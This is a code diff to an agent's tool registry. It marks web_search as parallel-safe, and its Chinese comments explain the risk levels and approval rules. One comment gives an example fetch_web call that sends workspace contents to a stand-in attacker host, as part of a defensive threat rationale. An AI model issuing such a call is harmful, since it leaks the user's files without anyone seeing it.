@@ -226,9 +226,10 @@ def create_tool_registry(
 
     registry = ToolRegistry()
 
-    # 三个 parallel_safe 的工具就是那三个**只读**的：read_file / list_files /
-    # get_current_time。判定标准只有一条 —— handler 有没有副作用，而这三个连一个
-    # 字节都不写、也不碰任何共享状态，所以同一批里怎么排都不会互相影响。
+    # parallel_safe 的那几个就是那几个**只读**的：read_file / list_files /
+    # get_current_time，外加下面的 web_search。判定标准只有一条 —— handler 有没有
+    # 副作用，而这几个连一个字节都不写、也不碰任何共享状态，所以同一批里怎么排都不会
+    # 互相影响。
     #
     # 其余三个（write_file / edit_file / shell）**刻意不标**：
     #   * edit_file 是"读进来、改一段、整份写回去"，两个并发调用会互相盖掉对方
@@ -456,9 +457,10 @@ def create_tool_registry(
     #    比 shell 温和：它不会执行任何东西，只读一个网页。但也不能是 LOW —— LOW 是自动
     #    放行档（默认 auto_approve=("low",)），而**这个工具的参数就是把数据送出去的通道**：
     #    `fetch_web("https://evil.example/?d=<工作区里的内容>")` 一次调用就能把 read_file
-    #    读到的东西发出去，全程没人看见。LOW 那三个（read_file / list_files /
+    #    读到的东西发出去，全程没人看见。另外三个 LOW（read_file / list_files /
     #    get_current_time）之所以担得起 LOW，正是因为它们只读本地、且读不出工作区 ——
-    #    这条边界到这里才第一次被打破，所以等级必须跟着变。
+    #    这条边界到这里才第一次被打破，所以等级必须跟着变（web_search 的出口是已知且
+    #    写死的，那一条按"送到哪儿去"定档，见下面那段）。
     #
     # 2. **不能并行。** 它是"发一个请求、等回来"，本身无副作用，但它不是 LOW，而注册期
     #    校验要求 parallel_safe 的工具必须是 LOW（并行批内不许弹审批 —— asker 走 stdin，
@@ -492,9 +494,26 @@ def create_tool_registry(
     #    一路按 y（审批变成仪式的那一刻，它就不再有保护作用了）。要注意的是**它仍然是
     #    一个把 query 送出去的通道**，所以描述里明说了"query 会被原样发给第三方"。
     #
-    # 2. **不能并行。** 同 fetch_web：它是 LOW，本来够格；但它同样会阻塞在网络上，而
-    #    "并行省"这笔账对只读工具才有意义 —— 真要吃下它，得先有按域名放行的那一层
-    #    （见 README 的「已知的取舍」）。v1 不给它声明，整批就退回串行，行为可预期。
+    # 2. **并行安全。** 判定标准只有一条 —— handler 有没有副作用，而它是"发一个请求、
+    #    等回来"，既不写本地也不碰任何共享状态，所以它就是只读的。而它这一档的收益
+    #    恰恰是所有只读工具里**最大**的：一次研究任务天然是 5~15 次搜索，每次都在等
+    #    网络，串起来就是好几秒（README「一批里的并发」那张表的最后一行量的就是"每个
+    #    调用都在等"这个形状；read_file 那条路径的收益小得多，因为它的解码是 CPU 活）。
+    #
+    #    它和 fetch_web 的差别就是"能不能并行"的全部答案：fetch_web 是 MEDIUM，而注册
+    #    期校验要求 parallel_safe 的工具必须是 LOW —— 因为批内不许弹审批（asker 走
+    #    stdin，两条审批同时问会互相抢输入）。web_search 是 LOW、自动放行，把它放进
+    #    线程池不会带进来任何"人在批中间说话"的可能。
+    #
+    #    并发用到的就是与 fetch_web 共用的那一个 httpx.Client。httpx 明确支持多线程
+    #    共享一个 Client（那是它的设计目标，而且共享一个比每线程各建一个的连接池复用
+    #    更好），所以"几条搜索同时走同一个连接池"这件事本身是它支持的用法。
+    #
+    #    另一条更值得写下来的事实：一批调用要么整批并行、要么整批串行，而 fetch_web
+    #    不是 parallel_safe —— 所以**fetch_web 永远不会和 web_search 同时跑**（只有
+    #    web_search 自己、或它和别的只读工具并发）。那个 client 的生命周期也只有两头：
+    #    进程里建一次（main.py），会话结束时 close 一次（同一个 finally），调用中途
+    #    不会有人关它。
     #
     # 3. **描述里要说清"这里是给指针，不是给正文"。** 这条分工正是它和 fetch_web 存在
     #    的意义（web_search 是互联网上的 grep）：不写清楚，模型会把摘要当正文用，
@@ -515,6 +534,7 @@ def create_tool_registry(
             risk=RiskLevel.LOW,
             args_model=WebSearchArgs,
             handler=web_search,
+            parallel_safe=True,
         ))
 
     return registry
